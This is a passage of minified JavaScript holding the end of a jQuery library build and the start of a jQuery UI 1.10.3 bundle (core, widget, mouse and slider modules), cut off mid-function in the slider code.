w.get(e,void 0,t,"script")}}),w.each(["get","post"],function(e,t){w[t]=function(e,n,r,i){return g(n)&&(i=i||r,r=n,n=void 0),w.ajax(w.extend({url:e,type:t,dataType:i,data:n,success:r},w.isPlainObject(e)&&e))}}),w._evalUrl=function(e){return w.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,"throws":!0})},w.fn.extend({wrapAll:function(e){var t;return this[0]&&(g(e)&&(e=e.call(this[0])),t=w(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(e){return g(e)?this.each(function(t){w(this).wrapInner(e.call(this,t))}):this.each(function(){var t=w(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=g(e);return this.each(function(n){w(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(e){return this.parent(e).not("body").each(function(){w(this).replaceWith(this.childNodes)}),this}}),w.expr.pseudos.hidden=function(e){return!w.expr.pseudos.visible(e)},w.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},w.ajaxSettings.xhr=function(){try{return new e.XMLHttpRequest}catch(e){}};var Vt={0:200,1223:204},Gt=w.ajaxSettings.xhr();h.cors=!!Gt&&"withCredentials"in Gt,h.ajax=Gt=!!Gt,w.ajaxTransport(function(t){var n,r;if(h.cors||Gt&&!t.crossDomain)return{send:function(i,o){var a,s=t.xhr();if(s.open(t.type,t.url,t.async,t.username,t.password),t.xhrFields)for(a in t.xhrFields)s[a]=t.xhrFields[a];t.mimeType&&s.overrideMimeType&&s.overrideMimeType(t.mimeType),t.crossDomain||i["X-Requested-With"]||(i["X-Requested-With"]="XMLHttpRequest");for(a in i)s.setRequestHeader(a,i[a]);n=function(e){return function(){n&&(n=r=s.onload=s.onerror=s.onabort=s.ontimeout=s.onreadystatechange=null,"abort"===e?s.abort():"error"===e?"number"!=typeof s.status?o(0,"error"):o(s.status,s.statusText):o(Vt[s.status]||s.status,s.statusText,"text"!==(s.responseType||"text")||"string"!=typeof s.responseText?{binary:s.response}:{text:s.responseText},s.getAllResponseHeaders()))}},s.onload=n(),r=s.onerror=s.ontimeout=n("error"),void 0!==s.onabort?s.onabort=r:s.onreadystatechange=function(){4===s.readyState&&e.setTimeout(function(){n&&r()})},n=n("abort");try{s.send(t.hasContent&&t.data||null)}catch(e){if(n)throw e}},abort:function(){n&&n()}}}),w.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),w.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return w.globalEval(e),e}}}),w.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),w.ajaxTransport("script",function(e){if(e.crossDomain){var t,n;return{send:function(i,o){t=w("<script>").prop({charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&o("error"===e.type?404:200,e.type)}),r.head.appendChild(t[0])},abort:function(){n&&n()}}}});var Yt=[],Qt=/(=)\?(?=&|$)|\?\?/;w.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Yt.pop()||w.expando+"_"+Et++;return this[e]=!0,e}}),w.ajaxPrefilter("json jsonp",function(t,n,r){var i,o,a,s=!1!==t.jsonp&&(Qt.test(t.url)?"url":"string"==typeof t.data&&0===(t.contentType||"").indexOf("application/x-www-form-urlencoded")&&Qt.test(t.data)&&"data");if(s||"jsonp"===t.dataTypes[0])return i=t.jsonpCallback=g(t.jsonpCallback)?t.jsonpCallback():t.jsonpCallback,s?t[s]=t[s].replace(Qt,"$1"+i):!1!==t.jsonp&&(t.url+=(kt.test(t.url)?"&":"?")+t.jsonp+"="+i),t.converters["script json"]=function(){return a||w.error(i+" was not called"),a[0]},t.dataTypes[0]="json",o=e[i],e[i]=function(){a=arguments},r.always(function(){void 0===o?w(e).removeProp(i):e[i]=o,t[i]&&(t.jsonpCallback=n.jsonpCallback,Yt.push(i)),a&&g(o)&&o(a[0]),a=o=void 0}),"script"}),h.createHTMLDocument=function(){var e=r.implementation.createHTMLDocument("").body;return e.innerHTML="<form></form><form></form>",2===e.childNodes.length}(),w.parseHTML=function(e,t,n){if("string"!=typeof e)return[];"boolean"==typeof t&&(n=t,t=!1);var i,o,a;return t||(h.createHTMLDocument?((i=(t=r.implementation.createHTMLDocument("")).createElement("base")).href=r.location.href,t.head.appendChild(i)):t=r),o=A.exec(e),a=!n&&[],o?[t.createElement(o[1])]:(o=xe([e],t,a),a&&a.length&&w(a).remove(),w.merge([],o.childNodes))},w.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return s>-1&&(r=vt(e.slice(s)),e=e.slice(0,s)),g(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),a.length>0&&w.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?w("<div>").append(w.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},w.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){w.fn[t]=function(e){return this.on(t,e)}}),w.expr.pseudos.animated=function(e){return w.grep(w.timers,function(t){return e===t.elem}).length},w.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l,c=w.css(e,"position"),f=w(e),p={};"static"===c&&(e.style.position="relative"),s=f.offset(),o=w.css(e,"top"),u=w.css(e,"left"),(l=("absolute"===c||"fixed"===c)&&(o+u).indexOf("auto")>-1)?(a=(r=f.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),g(t)&&(t=t.call(e,n,w.extend({},s))),null!=t.top&&(p.top=t.top-s.top+a),null!=t.left&&(p.left=t.left-s.left+i),"using"in t?t.using.call(e,p):f.css(p)}},w.fn.extend({offset:function(e){if(arguments.length)return void 0===e?this:this.each(function(t){w.offset.setOffset(this,e,t)});var t,n,r=this[0];if(r)return r.getClientRects().length?(t=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:t.top+n.pageYOffset,left:t.left+n.pageXOffset}):{top:0,left:0}},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===w.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===w.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=w(e).offset()).top+=w.css(e,"borderTopWidth",!0),i.left+=w.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-w.css(r,"marginTop",!0),left:t.left-i.left-w.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===w.css(e,"position"))e=e.offsetParent;return e||be})}}),w.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(e,t){var n="pageYOffset"===t;w.fn[e]=function(r){return z(this,function(e,r,i){var o;if(y(e)?o=e:9===e.nodeType&&(o=e.defaultView),void 0===i)return o?o[t]:e[r];o?o.scrollTo(n?o.pageXOffset:i,n?i:o.pageYOffset):e[r]=i},e,r,arguments.length)}}),w.each(["top","left"],function(e,t){w.cssHooks[t]=_e(h.pixelPosition,function(e,n){if(n)return n=Fe(e,t),We.test(n)?w(e).position()[t]+"px":n})}),w.each({Height:"height",Width:"width"},function(e,t){w.each({padding:"inner"+e,content:t,"":"outer"+e},function(n,r){w.fn[r]=function(i,o){var a=arguments.length&&(n||"boolean"!=typeof i),s=n||(!0===i||!0===o?"margin":"border");return z(this,function(t,n,i){var o;return y(t)?0===r.indexOf("outer")?t["inner"+e]:t.document.documentElement["client"+e]:9===t.nodeType?(o=t.documentElement,Math.max(t.body["scroll"+e],o["scroll"+e],t.body["offset"+e],o["offset"+e],o["client"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}}),w.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},"function"==typeof define&&define.amd&&define("jquery",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});











/*! jQuery UI - v1.10.3 - 2013-12-15
* http://jqueryui.com
* Includes: jquery.ui.core.js, jquery.ui.widget.js, jquery.ui.mouse.js, jquery.ui.slider.js
* Copyright 2013 jQuery Foundation and other contributors; Licensed MIT */

(function(e,t){function i(t,i){var s,n,r,o=t.nodeName.toLowerCase();return"area"===o?(s=t.parentNode,n=s.name,t.href&&n&&"map"===s.nodeName.toLowerCase()?(r=e("img[usemap=#"+n+"]")[0],!!r&&a(r)):!1):(/input|select|textarea|button|object/.test(o)?!t.disabled:"a"===o?t.href||i:i)&&a(t)}function a(t){return e.expr.filters.visible(t)&&!e(t).parents().addBack().filter(function(){return"hidden"===e.css(this,"visibility")}).length}var s=0,n=/^ui-id-\d+$/;e.ui=e.ui||{},e.extend(e.ui,{version:"1.10.3",keyCode:{BACKSPACE:8,COMMA:188,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,LEFT:37,NUMPAD_ADD:107,NUMPAD_DECIMAL:110,NUMPAD_DIVIDE:111,NUMPAD_ENTER:108,NUMPAD_MULTIPLY:106,NUMPAD_SUBTRACT:109,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SPACE:32,TAB:9,UP:38}}),e.fn.extend({focus:function(t){return function(i,a){return"number"==typeof i?this.each(function(){var t=this;setTimeout(function(){e(t).focus(),a&&a.call(t)},i)}):t.apply(this,arguments)}}(e.fn.focus),scrollParent:function(){var t;return t=e.ui.ie&&/(static|relative)/.test(this.css("position"))||/absolute/.test(this.css("position"))?this.parents().filter(function(){return/(relative|absolute|fixed)/.test(e.css(this,"position"))&&/(auto|scroll)/.test(e.css(this,"overflow")+e.css(this,"overflow-y")+e.css(this,"overflow-x"))}).eq(0):this.parents().filter(function(){return/(auto|scroll)/.test(e.css(this,"overflow")+e.css(this,"overflow-y")+e.css(this,"overflow-x"))}).eq(0),/fixed/.test(this.css("position"))||!t.length?e(document):t},zIndex:function(i){if(i!==t)return this.css("zIndex",i);if(this.length)for(var a,s,n=e(this[0]);n.length&&n[0]!==document;){if(a=n.css("position"),("absolute"===a||"relative"===a||"fixed"===a)&&(s=parseInt(n.css("zIndex"),10),!isNaN(s)&&0!==s))return s;n=n.parent()}return 0},uniqueId:function(){return this.each(function(){this.id||(this.id="ui-id-"+ ++s)})},removeUniqueId:function(){return this.each(function(){n.test(this.id)&&e(this).removeAttr("id")})}}),e.extend(e.expr[":"],{data:e.expr.createPseudo?e.expr.createPseudo(function(t){return function(i){return!!e.data(i,t)}}):function(t,i,a){return!!e.data(t,a[3])},focusable:function(t){return i(t,!isNaN(e.attr(t,"tabindex")))},tabbable:function(t){var a=e.attr(t,"tabindex"),s=isNaN(a);return(s||a>=0)&&i(t,!s)}}),e("<a>").outerWidth(1).jquery||e.each(["Width","Height"],function(i,a){function s(t,i,a,s){return e.each(n,function(){i-=parseFloat(e.css(t,"padding"+this))||0,a&&(i-=parseFloat(e.css(t,"border"+this+"Width"))||0),s&&(i-=parseFloat(e.css(t,"margin"+this))||0)}),i}var n="Width"===a?["Left","Right"]:["Top","Bottom"],r=a.toLowerCase(),o={innerWidth:e.fn.innerWidth,innerHeight:e.fn.innerHeight,outerWidth:e.fn.outerWidth,outerHeight:e.fn.outerHeight};e.fn["inner"+a]=function(i){return i===t?o["inner"+a].call(this):this.each(function(){e(this).css(r,s(this,i)+"px")})},e.fn["outer"+a]=function(t,i){return"number"!=typeof t?o["outer"+a].call(this,t):this.each(function(){e(this).css(r,s(this,t,!0,i)+"px")})}}),e.fn.addBack||(e.fn.addBack=function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}),e("<a>").data("a-b","a").removeData("a-b").data("a-b")&&(e.fn.removeData=function(t){return function(i){return arguments.length?t.call(this,e.camelCase(i)):t.call(this)}}(e.fn.removeData)),e.ui.ie=!!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase()),e.support.selectstart="onselectstart"in document.createElement("div"),e.fn.extend({disableSelection:function(){return this.bind((e.support.selectstart?"selectstart":"mousedown")+".ui-disableSelection",function(e){e.preventDefault()})},enableSelection:function(){return this.unbind(".ui-disableSelection")}}),e.extend(e.ui,{plugin:{add:function(t,i,a){var s,n=e.ui[t].prototype;for(s in a)n.plugins[s]=n.plugins[s]||[],n.plugins[s].push([i,a[s]])},call:function(e,t,i){var a,s=e.plugins[t];if(s&&e.element[0].parentNode&&11!==e.element[0].parentNode.nodeType)for(a=0;s.length>a;a++)e.options[s[a][0]]&&s[a][1].apply(e.element,i)}},hasScroll:function(t,i){if("hidden"===e(t).css("overflow"))return!1;var a=i&&"left"===i?"scrollLeft":"scrollTop",s=!1;return t[a]>0?!0:(t[a]=1,s=t[a]>0,t[a]=0,s)}})})(jQuery);(function(e,t){var i=0,s=Array.prototype.slice,a=e.cleanData;e.cleanData=function(t){for(var i,s=0;null!=(i=t[s]);s++)try{e(i).triggerHandler("remove")}catch(n){}a(t)},e.widget=function(i,s,a){var n,r,o,h,l={},u=i.split(".")[0];i=i.split(".")[1],n=u+"-"+i,a||(a=s,s=e.Widget),e.expr[":"][n.toLowerCase()]=function(t){return!!e.data(t,n)},e[u]=e[u]||{},r=e[u][i],o=e[u][i]=function(e,i){return this._createWidget?(arguments.length&&this._createWidget(e,i),t):new o(e,i)},e.extend(o,r,{version:a.version,_proto:e.extend({},a),_childConstructors:[]}),h=new s,h.options=e.widget.extend({},h.options),e.each(a,function(i,a){return e.isFunction(a)?(l[i]=function(){var e=function(){return s.prototype[i].apply(this,arguments)},t=function(e){return s.prototype[i].apply(this,e)};return function(){var i,s=this._super,n=this._superApply;return this._super=e,this._superApply=t,i=a.apply(this,arguments),this._super=s,this._superApply=n,i}}(),t):(l[i]=a,t)}),o.prototype=e.widget.extend(h,{widgetEventPrefix:r?h.widgetEventPrefix:i},l,{constructor:o,namespace:u,widgetName:i,widgetFullName:n}),r?(e.each(r._childConstructors,function(t,i){var s=i.prototype;e.widget(s.namespace+"."+s.widgetName,o,i._proto)}),delete r._childConstructors):s._childConstructors.push(o),e.widget.bridge(i,o)},e.widget.extend=function(i){for(var a,n,r=s.call(arguments,1),o=0,h=r.length;h>o;o++)for(a in r[o])n=r[o][a],r[o].hasOwnProperty(a)&&n!==t&&(i[a]=e.isPlainObject(n)?e.isPlainObject(i[a])?e.widget.extend({},i[a],n):e.widget.extend({},n):n);return i},e.widget.bridge=function(i,a){var n=a.prototype.widgetFullName||i;e.fn[i]=function(r){var o="string"==typeof r,h=s.call(arguments,1),l=this;return r=!o&&h.length?e.widget.extend.apply(null,[r].concat(h)):r,o?this.each(function(){var s,a=e.data(this,n);return a?e.isFunction(a[r])&&"_"!==r.charAt(0)?(s=a[r].apply(a,h),s!==a&&s!==t?(l=s&&s.jquery?l.pushStack(s.get()):s,!1):t):e.error("no such method '"+r+"' for "+i+" widget instance"):e.error("cannot call methods on "+i+" prior to initialization; "+"attempted to call method '"+r+"'")}):this.each(function(){var t=e.data(this,n);t?t.option(r||{})._init():e.data(this,n,new a(r,this))}),l}},e.Widget=function(){},e.Widget._childConstructors=[],e.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",defaultElement:"<div>",options:{disabled:!1,create:null},_createWidget:function(t,s){s=e(s||this.defaultElement||this)[0],this.element=e(s),this.uuid=i++,this.eventNamespace="."+this.widgetName+this.uuid,this.options=e.widget.extend({},this.options,this._getCreateOptions(),t),this.bindings=e(),this.hoverable=e(),this.focusable=e(),s!==this&&(e.data(s,this.widgetFullName,this),this._on(!0,this.element,{remove:function(e){e.target===s&&this.destroy()}}),this.document=e(s.style?s.ownerDocument:s.document||s),this.window=e(this.document[0].defaultView||this.document[0].parentWindow)),this._create(),this._trigger("create",null,this._getCreateEventData()),this._init()},_getCreateOptions:e.noop,_getCreateEventData:e.noop,_create:e.noop,_init:e.noop,destroy:function(){this._destroy(),this.element.unbind(this.eventNamespace).removeData(this.widgetName).removeData(this.widgetFullName).removeData(e.camelCase(this.widgetFullName)),this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName+"-disabled "+"ui-state-disabled"),this.bindings.unbind(this.eventNamespace),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")},_destroy:e.noop,widget:function(){return this.element},option:function(i,s){var a,n,r,o=i;if(0===arguments.length)return e.widget.extend({},this.options);if("string"==typeof i)if(o={},a=i.split("."),i=a.shift(),a.length){for(n=o[i]=e.widget.extend({},this.options[i]),r=0;a.length-1>r;r++)n[a[r]]=n[a[r]]||{},n=n[a[r]];if(i=a.pop(),s===t)return n[i]===t?null:n[i];n[i]=s}else{if(s===t)return this.options[i]===t?null:this.options[i];o[i]=s}return this._setOptions(o),this},_setOptions:function(e){var t;for(t in e)this._setOption(t,e[t]);return this},_setOption:function(e,t){return this.options[e]=t,"disabled"===e&&(this.widget().toggleClass(this.widgetFullName+"-disabled ui-state-disabled",!!t).attr("aria-disabled",t),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")),this},enable:function(){return this._setOption("disabled",!1)},disable:function(){return this._setOption("disabled",!0)},_on:function(i,s,a){var n,r=this;"boolean"!=typeof i&&(a=s,s=i,i=!1),a?(s=n=e(s),this.bindings=this.bindings.add(s)):(a=s,s=this.element,n=this.widget()),e.each(a,function(a,o){function h(){return i||r.options.disabled!==!0&&!e(this).hasClass("ui-state-disabled")?("string"==typeof o?r[o]:o).apply(r,arguments):t}"string"!=typeof o&&(h.guid=o.guid=o.guid||h.guid||e.guid++);var l=a.match(/^(\w+)\s*(.*)$/),u=l[1]+r.eventNamespace,c=l[2];c?n.delegate(c,u,h):s.bind(u,h)})},_off:function(e,t){t=(t||"").split(" ").join(this.eventNamespace+" ")+this.eventNamespace,e.unbind(t).undelegate(t)},_delay:function(e,t){function i(){return("string"==typeof e?s[e]:e).apply(s,arguments)}var s=this;return setTimeout(i,t||0)},_hoverable:function(t){this.hoverable=this.hoverable.add(t),this._on(t,{mouseenter:function(t){e(t.currentTarget).addClass("ui-state-hover")},mouseleave:function(t){e(t.currentTarget).removeClass("ui-state-hover")}})},_focusable:function(t){this.focusable=this.focusable.add(t),this._on(t,{focusin:function(t){e(t.currentTarget).addClass("ui-state-focus")},focusout:function(t){e(t.currentTarget).removeClass("ui-state-focus")}})},_trigger:function(t,i,s){var a,n,r=this.options[t];if(s=s||{},i=e.Event(i),i.type=(t===this.widgetEventPrefix?t:this.widgetEventPrefix+t).toLowerCase(),i.target=this.element[0],n=i.originalEvent)for(a in n)a in i||(i[a]=n[a]);return this.element.trigger(i,s),!(e.isFunction(r)&&r.apply(this.element[0],[i].concat(s))===!1||i.isDefaultPrevented())}},e.each({show:"fadeIn",hide:"fadeOut"},function(t,i){e.Widget.prototype["_"+t]=function(s,a,n){"string"==typeof a&&(a={effect:a});var r,o=a?a===!0||"number"==typeof a?i:a.effect||i:t;a=a||{},"number"==typeof a&&(a={duration:a}),r=!e.isEmptyObject(a),a.complete=n,a.delay&&s.delay(a.delay),r&&e.effects&&e.effects.effect[o]?s[t](a):o!==t&&s[o]?s[o](a.duration,a.easing,n):s.queue(function(i){e(this)[t](),n&&n.call(s[0]),i()})}})})(jQuery);(function(e){var t=!1;e(document).mouseup(function(){t=!1}),e.widget("ui.mouse",{version:"1.10.3",options:{cancel:"input,textarea,button,select,option",distance:1,delay:0},_mouseInit:function(){var t=this;this.element.bind("mousedown."+this.widgetName,function(e){return t._mouseDown(e)}).bind("click."+this.widgetName,function(i){return!0===e.data(i.target,t.widgetName+".preventClickEvent")?(e.removeData(i.target,t.widgetName+".preventClickEvent"),i.stopImmediatePropagation(),!1):undefined}),this.started=!1},_mouseDestroy:function(){this.element.unbind("."+this.widgetName),this._mouseMoveDelegate&&e(document).unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate)},_mouseDown:function(i){if(!t){this._mouseStarted&&this._mouseUp(i),this._mouseDownEvent=i;var s=this,a=1===i.which,n="string"==typeof this.options.cancel&&i.target.nodeName?e(i.target).closest(this.options.cancel).length:!1;return a&&!n&&this._mouseCapture(i)?(this.mouseDelayMet=!this.options.delay,this.mouseDelayMet||(this._mouseDelayTimer=setTimeout(function(){s.mouseDelayMet=!0},this.options.delay)),this._mouseDistanceMet(i)&&this._mouseDelayMet(i)&&(this._mouseStarted=this._mouseStart(i)!==!1,!this._mouseStarted)?(i.preventDefault(),!0):(!0===e.data(i.target,this.widgetName+".preventClickEvent")&&e.removeData(i.target,this.widgetName+".preventClickEvent"),this._mouseMoveDelegate=function(e){return s._mouseMove(e)},this._mouseUpDelegate=function(e){return s._mouseUp(e)},e(document).bind("mousemove."+this.widgetName,this._mouseMoveDelegate).bind("mouseup."+this.widgetName,this._mouseUpDelegate),i.preventDefault(),t=!0,!0)):!0}},_mouseMove:function(t){return e.ui.ie&&(!document.documentMode||9>document.documentMode)&&!t.button?this._mouseUp(t):this._mouseStarted?(this._mouseDrag(t),t.preventDefault()):(this._mouseDistanceMet(t)&&this._mouseDelayMet(t)&&(this._mouseStarted=this._mouseStart(this._mouseDownEvent,t)!==!1,this._mouseStarted?this._mouseDrag(t):this._mouseUp(t)),!this._mouseStarted)},_mouseUp:function(t){return e(document).unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate),this._mouseStarted&&(this._mouseStarted=!1,t.target===this._mouseDownEvent.target&&e.data(t.target,this.widgetName+".preventClickEvent",!0),this._mouseStop(t)),!1},_mouseDistanceMet:function(e){return Math.max(Math.abs(this._mouseDownEvent.pageX-e.pageX),Math.abs(this._mouseDownEvent.pageY-e.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return!0}})})(jQuery);(function(e){var t=5;e.widget("ui.slider",e.ui.mouse,{version:"1.10.3",widgetEventPrefix:"slide",options:{animate:!1,distance:0,max:100,min:0,orientation:"horizontal",range:!1,step:1,value:0,values:null,change:null,slide:null,start:null,stop:null},_create:function(){this._keySliding=!1,this._mouseSliding=!1,this._animateOff=!0,this._handleIndex=null,this._detectOrientation(),this._mouseInit(),this.element.addClass("ui-slider ui-slider-"+this.orientation+" ui-widget"+" ui-widget-content"+" ui-corner-all"),this._refresh(),this._setOption("disabled",this.options.disabled),this._animateOff=!1},_refresh:function(){this._createRange(),this._createHandles(),this._setupEvents(),this._refreshValue()},_createHandles:function(){var t,i,s=this.options,a=this.element.find(".ui-slider-handle").addClass("ui-state-default ui-corner-all"),n="<a class='ui-slider-handle ui-state-default ui-corner-all' href='#'></a>",r=[];for(i=s.values&&s.values.length||1,a.length>i&&(a.slice(i).remove(),a=a.slice(0,i)),t=a.length;i>t;t++)r.push(n);this.handles=a.add(e(r.join("")).appendTo(this.element)),this.handle=this.handles.eq(0),this.handles.each(function(t){e(this).data("ui-slider-handle-index",t)})},_createRange:function(){var t=this.options,i="";t.range?(t.range===!0&&(t.values?t.values.length&&2!==t.values.length?t.values=[t.values[0],t.values[0]]:e.isArray(t.values)&&(t.values=t.values.slice(0)):t.values=[this._valueMin(),this._valueMin()]),this.range&&this.range.length?this.range.removeClass("ui-slider-range-min ui-slider-range-max").css({left:"",bottom:""}):(this.range=e("<div></div>").appendTo(this.element),i="ui-slider-range ui-widget-header ui-corner-all"),this.range.addClass(i+("min"===t.range||"max"===t.range?" ui-slider-range-"+t.range:""))):this.range=e([])},_setupEvents:function(){var e=this.handles.add(this.range).filter("a");this._off(e),this._on(e,this._handleEvents),this._hoverable(e),this._focusable(e)},_destroy:function(){this.handles.remove(),this.range.remove(),this.element.removeClass("ui-slider ui-slider-horizontal ui-slider-vertical ui-widget ui-widget-content ui-corner-all"),this._mouseDestroy()},_mouseCapture:function(t){var i,s,a,n,r,o,h,l,u=this,c=this.options;return c.disabled?!1:(this.elementSize={width:this.element.outerWidth(),height:this.element.outerHeight()},this.elementOffset=this.element.offset(),i={x:t.pageX,y:t.pageY},s=this._normValueFromMouse(i),a=this._valueMax()-this._valueMin()+1,this.handles.each(function(t){var i=Math.abs(s-u.values(t));(a>i||a===i&&(t===u._lastChangedValue||u.values(t)===c.min))&&(a=i,n=e(this),r=t)}),o=this._start(t,r),o===!1?!1:(this._mouseSliding=!0,this._handleIndex=r,n.addClass("ui-state-active").focus(),h=n.offset(),l=!e(t.target).parents().addBack().is(".ui-slider-handle"),this._clickOffset=l?{left:0,top:0}:{left:t.pageX-h.left-n.width()/2,top:t.pageY-h.top-n.height()/2-(parseInt(n.css("borderTopWidth"),10)||0)-(parseInt(n.css("borderBottomWidth"),10)||0)+(parseInt(n.css("marginTop"),10)||0)},this.handles.hasClass("ui-state-hover")||this._slide(t,r,s),this._animateOff=!0,!0))},_mouseStart:function(){return!0},_mouseDrag:function(e){var t={x:e.pageX,y:e.pageY},i=this._normValueFromMouse(t);return this._slide(e,this._handleIndex,i),!1},_mouseStop:function(e){return this.handles.removeClass("ui-state-active"),this._mouseSliding=!1,this._stop(e,this._handleIndex),this._change(e,this._handleIndex),this._handleIndex=null,this._clickOffset=null,this._animateOff=!1,!1},_detectOrientation:function(){this.orientation="vertical"===this.options.orientation?"vertical":"horizontal"},_normValueFromMouse:function(e){var t,i,s,a,n;return"horizontal"===this.orientation?(t=this.elementSize.width,i=e.x-this.elementOffset.left-(this._clickOffset?this._clickOffset.left:0)):(t=this.elementSize.height,i=e.y-this.elementOffset.top-(this._clickOffset?this._clickOffset.top:0)),s=i/t,s>1&&(s=1),0>s&&(s=0),"vertical"===this.orientation&&(s=1-s),a=this._valueMax()-this._valueMin(),n=this._valueMin()+s*a,this._trimAlignValue(n)},_start:function(e,t){var i={handle:this.handles[t],value:this.value()};return this.options.values&&this.options.values.length&&(i.value=this.values(t),i.values=this.values()),this._trigger("start",e,i)},_slide:function(e,t,i){var s,a,n;this.options.values&&this.options.values.length?(s=this.values(t?0:1),2===this.options.values.length&&this.options.range===!0&&(0===t&&i>s||1===t&&s>i)&&(i=s),i!==this.values(t)&&(a=this.values(),a[t]=i,n=this._trigger("slide",e,{handle:this.handles[t],value:i,values:a}),s=this.values(t?0:1),n!==!1&&this.values(t,i,!0))):i!==this.value()&&(n=this._trigger("slide",e,{handle:this.handles[t],value:i}),n!==!1&&this.value(i))},_stop:function(e,t){var i={handle:this.handles[t],value:this.value()};this.options.values&&this.options.values.length&&(i.value=this.values(t),i.values=this.values()),this._trigger("stop",e,i)},_change:function(e,t){if(!this._keySliding&&!this._mouseSliding){var i={handle:this.handles[t],value:this.value()};this.options.values&&this.options.values.length&&(i.value=this.values(t),i.values=this.values()),this._lastChangedValue=t,this._trigger("change",e,i)}},value:function(e){return arguments.length?(this.options.value=this._trimAlignValue(e),this._refreshValue(),this._change(null,0),undefined):this._value()},values:function(t,i){var s,a,n;if(arguments.length>1)return this.options.values[t]=this._trimAlignValue(i),this._refreshValue(),this._change(null,t),undefined;if(!arguments.length)return this._values();if(!e.isArray(arguments[0]))return this.options.values&&this.options.values.length?this._values(t):this.value();for(s=this.options.values,a=arguments[0],n=0;s.length>n;n+=1)s[n]=this._trimAlignValue(a[n]),this._change(null,n);this._refreshValue()},_setOption:function(t,i){var s,a=0;switch("range"===t&&this.options.range===!0&&("min"===i?(this.options.value=this._values(0),this.options.values=null):"max"===i&&(this.options.value=this._values(this.options.values.length-1),this.options.values=null)),e.isArray(this.options.values)&&(a=this.options.values.length),e.Widget.prototype._setOption.apply(this,arguments),t){case"orientation":this._detectOrientation(),this.element.removeClass("ui-slider-horizontal ui-slider-vertical").addClass("ui-slider-"+this.orientation),this._refreshValue();break;case"value":this._animateOff=!0,this._refreshValue(),this._change(null,0),this._animateOff=!1;break;case"values":for(this._animateOff=!0,this._refreshValue(),s=0;a>s;s+=1)this._change(null,s);this._animateOff=!1;break;case"min":case"max":this._animateOff=!0,this._refreshValue(),this._animateOff=!1;break;case"range":this._animateOff=!0,this._refresh(),this._animateOff=!1}},_value:function(){var e=this.options.value;return e=this._trimAlignValue(e)},_values:function(e){var t,i,s;if(arguments.length)return 